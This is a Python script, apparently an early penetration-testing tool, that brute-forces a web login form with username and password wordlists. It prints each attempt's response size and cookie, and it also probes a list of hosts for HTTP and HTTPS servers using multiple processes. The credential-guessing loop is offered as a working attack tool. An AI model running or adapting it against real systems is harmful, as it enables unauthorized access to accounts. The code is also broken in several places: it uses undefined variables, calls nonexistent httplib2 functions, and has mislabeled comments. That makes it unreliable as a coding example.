import urllib, httplib2, argparse, sys,multiprocessing,time,logging, datetime

def host_test(users, passes, target):
    with open(users) as f:
        usernames = f.readlines()
    with open(passes) as g:
        passwords = g.readlines()
    http = httplib2.Http()
    http.follow_redirects = True
    for user in usernames:
        for passwd in passwords:
            header = {'Content-type': 'application/x-www-form-urlencoded'}
            parameters = {'username' : user.rstrip('\n'), 'password':passwd.rstrip('\n'), 'Submit':'Login'}
            print("[*] Testing username %s and password %s against %s") % (user.rstrip('\n'), passwd.rstrip('\n'), target.rstrip('\n'))
            response, content = http.request(target, 'POST', headers=header, body=urllib.urlencode(parameters))
            print("[*] The response size is: %s") % (len(content))
            print("[*] The cookie for this attempt is: %s") % (str(response['set-cookie']))

def host_request(host):
    print("[*] Testing %s") % (str(host))
    targets = "http://" + host
    target_secure = "https://" + host
    timenow = time.time()
    record = datetime.datetime.fromtimestamp(timenow).strftime('%Y-%m-%d %H:%M:%S')
    logger = logging.getLogger(record)
    try:
        request = httplib2.Request(target)
        request.get_method = lambda : 'HEAD'
        response = httplib2.urlopen(request)
        response_data = str(response.info())
        logger.debug("[*] %s" % response_data)
        response.close()
    except:
        response = None
        response_data = None
    try:
        request_secure = httplib2.urlopen(target_secure)
        request_secure.get_method = lambda : 'HEAD'
        response_secure = str(httplib2.urlopen(request_secure).read())
        response_secure_data = str(response.info())
        logger.debug("[*] %s" % response_secure_data)
        response_secure.close()
    except:
        response_secure = None
        response_secure_data = None
    if response_data != None and response_secure_data != None:
        r = "[+] Insecure webserver detected at %s reported by %s" % (target, str(multiprocessing.Process().name))
        rs = "[+] Secure webserver detected at %s reported by %s" % (target_secure, str(multiprocessing.Process().name))
        logger.debug("[+] Insecure web server detected at %s and reported by process %s" % (str(target), str(multiprocessing.Process().name)))
        logger.debug("[+] Secure web server detected at %s and reported by process %s" % (str(target_secure), str(multiprocessing.Process().name)))
        return(r, rs)
    elif response_data == None and response_secure_data == None:
        r = "[-] No insecure webserver at %s reported by %s" % (target, str(multiprocessing.Process().name))
        rs = "[-] No secure webserver at %s reported by %s" % (target_secure, str(multiprocessing.Process().name))
        logger.debug("[-] Insecure web server was not detected at %s and reported by process %s" % (str(target), str(multiprocessing.Process().name)))
        logger.debug("[-] Secure web server was not detected at %s and reported by process %s" % (str(target_secure), str(multiprocessing.Process().name)))
        return(r, rs)
    elif response_data != None and response_secure_data == None:
        r = "[+] Insecure webserver detected at %s reported by %s" % (target, str(multiprocessing.Process().name))
        rs = "[-] No secure webserver at %s reported by %s" % (target_secure, str(multiprocessing.Process().name))
        logger.debug("[+] Insecure web server detected at %s and reported by process %s" % (str(target), str(multiprocessing.Process().name)))
        logger.debug("[-] Secure web server was not detected at %s and reported by process %s" % (str(target_secure), str(multiprocessing.Process().name)))
        return(r, rs)
    elif response_secure_data != None and response_data == None:
        r = "[-] No insecure webserver at %s reported by %s" % (target, str(multiprocessing.Process().name))
        rs = "[+] Secure webserver detected at %s reported by %s" % (target_secure, str(multiprocessing.Process().name))
        logger.debug("[-] Insecure web server was not detected at %s and reported by process %s" % (str(target), str(multiprocessing.Process().name)))
        logger.debug("[+] Secure web server detected at %s and reported by process %s" % (str(target_secure), str(multiprocessing.Process().name)))
        return(r, rs)
    else:
        logger.debug("[-] No results were recorded for %s or %s" % (str(target), str(target_secure)))

def log_init(log):
    level = logging.DEBUG                                                                             # Logging level
    format = logging.Formatter("%(asctime)s [%(threadName)-12.12s] [%(levelname)-5.5s]  %(message)s") # Log format
    logger_obj = logging.getLogger()                                                                  # Getter for logging agent
    file_handler = logging.FileHandler(log)                                                           # File Handler
    #stderr_handler = logging.StreamHandler()                                                          # STDERR Handler
    targets_list = []

    # Configure logger formats for STDERR and output file
    file_handler.setFormatter(format)
    #stderr_handler.setFormatter(format)

    # Configure logger object
    logger_obj.addHandler(file_handler)
    #logger_obj.addHandler(stderr_handler)
    logger_obj.setLevel(level)


def main():
    # If script is executed at the CLI
    usage = '''usage: %(prog)s [-t http://127.0.0.1] [-u username] [-p password] -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-t", action="store", dest="target", default=None, help="Host to test")
    parser.add_argument("-u", action="store", dest="username", default=None, help="Filename of usernames to test for")
    parser.add_argument("-p", action="store", dest="password", default=None, help="Filename of passwords to test for")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument("-f", "--filename", type=str, action="store", dest="filename", default="xml_output", help="The filename that will be used to create an XLSX")
    parser.add_argument("-m", "--multi", action="store", dest="processes", default=1, type=int, help="Number of proceses, defaults to 1")
    parser.add_argument("-l", "--logfile", action="store", dest="log", default="results.log", type=str, help="The log file to output the results")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()
   

    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if (args.target == None) or (args.password == None) or (args.username == None):
        parser.print_help()
        sys.exit(1)

    # Set Constructors
    verbose = args.verbose     # Verbosity level
    username = args.username   # The password to use for the dictionary attack
    password = args.password   # The username to use for the dictionary attack
    target = args.target       # Password or hash to test against default is admin
    targets = args.targets                                                                            # Targets to be parsed
    verbose = args.verbose                                                                            # Verbosity level
    processes = args.processes                                                                        # processes to be used
    log = args.log                                                                                    # Configure the log output file
    if ".log" not in log:
        log = log + ".log"


    with open(targets) as f:
        targets_list = [line.rstrip() for line in f.readlines()]

         # Establish thread list
    pool = multiprocessing.Pool(processes=processes, initializer=log_init(log))

    # Queue up the targets to assess
    results = pool.map(host_request, targets_list)

    for result in results:
        for value in result:
            print(value)

    host_test(username, password, target)
   # host_request(host)
    #log_init(log)



if __name__ == '__main__':
    main()
